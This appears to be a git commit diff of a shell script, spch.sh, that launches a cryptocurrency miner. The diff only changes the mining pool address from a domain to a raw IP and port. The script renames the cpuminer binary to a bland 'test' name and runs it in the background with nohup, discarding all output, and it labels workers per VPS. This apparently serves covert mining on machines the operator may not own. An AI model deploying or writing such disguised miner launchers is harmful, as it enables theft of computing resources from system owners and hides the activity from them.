c9d6d868f6dbbd47387c98f905a9bb8eb04ffd69
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-11-24 11:54:11 +0700

    Update spch.sh

--- spch.sh
+++ spch.sh
@@ -8,4 +8,4 @@ tar -xzf dot
 
 mv cpuminer-sse2 test$kolot
 
-nohup ./test$kolot -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
+nohup ./test$kolot -a yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
